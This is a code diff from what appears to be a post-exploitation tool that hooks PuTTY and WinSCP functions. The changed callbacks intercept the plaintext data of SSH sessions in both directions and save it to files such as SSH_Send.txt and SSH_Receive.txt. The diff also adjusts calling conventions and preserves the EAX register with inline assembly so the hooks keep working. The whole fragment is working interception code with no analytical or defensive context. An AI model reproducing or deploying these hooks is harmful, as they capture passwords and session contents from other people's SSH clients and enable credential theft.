@@ -425,7 +425,7 @@ void PuttySend_Callback(void *handle, char *buf, int len, int interactive)
 
 	if(FunctionFlow::CheckFlag() == FALSE)
 	{
-		if(buf != NULL) PluginSystem::ProcessAndSaveWrite("PuttySend.txt", (unsigned char *)buf, 1);
+		if(buf != NULL) PluginSystem::ProcessAndSaveWrite("PuttySend.txt", (unsigned char *)buf, len);
 	}
 
 	// Call original function
@@ -456,41 +456,68 @@ int PuttyRecv_Callback(void *term, int is_stderr, const char *data, int len)
 
 // SSH_Pktsend - WinSCP send callback
 
-void SSH_Pktsend_Callback(void *ssh, Packet *pkt)
+void __fastcall SSH_Pktsend_Callback(int datalen, unsigned char *data)
 {
+	DWORD pThis = 0;
+
+	// Backup EAX register
+
+#if defined _M_IX86
+	__asm { mov pThis, EAX }
+#endif 
+
 	// If allowed
 
 	if(FunctionFlow::CheckFlag() == FALSE)
 	{
-		if(pkt->data != NULL && pkt->length > 0) PluginSystem::ProcessAndSaveWrite("SSH_Pktsend.txt", (unsigned char *)pkt->data, pkt->length);
+		if(data != NULL && datalen > 0) PluginSystem::ProcessAndSaveWrite("SSH_Send.txt", data, datalen);
 	}
+
+	// Restore EAX register
+
+#if defined _M_IX86
+	__asm { mov EAX, pThis }
+#endif
 
 	// Call original function
 	
-	SSH_Pktsend_Original(ssh, pkt);
+	SSH_Pktsend_Original(datalen, data);
 
 	FunctionFlow::UnCheckFlag();
 }
 
 // SSH_Rdpkt - WinSCP receive callback
 
-Packet* SSH_Rdpkt_Callback(void *ssh, unsigned char **data, int *datalen)
+int __fastcall SSH_Rdpkt_Callback(int datalen, unsigned char *data)
 {
-	Packet *pkt;
+	DWORD pThis = 0;
+
+	// Backup EAX register
+
+#if defined _M_IX86
+	__asm { mov pThis, EAX }
+#endif
 
 	BOOL bFlag = FunctionFlow::CheckFlag();
-	pkt = SSH_Rdpkt_Original(ssh, data, datalen);
+
+	// Restore EAX register
+
+#if defined _M_IX86
+	__asm { mov EAX, pThis }
+#endif
+
+	int ret = SSH_Rdpkt_Original(datalen, data);
 
 	// Do things
 
-	if(bFlag == FALSE && pkt != NULL)
+	if(bFlag == FALSE)
 	{
-		if(pkt->data != NULL && pkt->length > 0) PluginSystem::ProcessAndSaveRead("SSH_Rdpkt.txt", (unsigned char *)pkt->data, pkt->length);
+		if(data != NULL && datalen > 0) PluginSystem::ProcessAndSaveRead("SSH_Receive.txt", data, datalen);
 	}
 
 	FunctionFlow::UnCheckFlag();
 
-	return pkt;
+	return ret;
 }
 
 // SecureCRT_Write callback
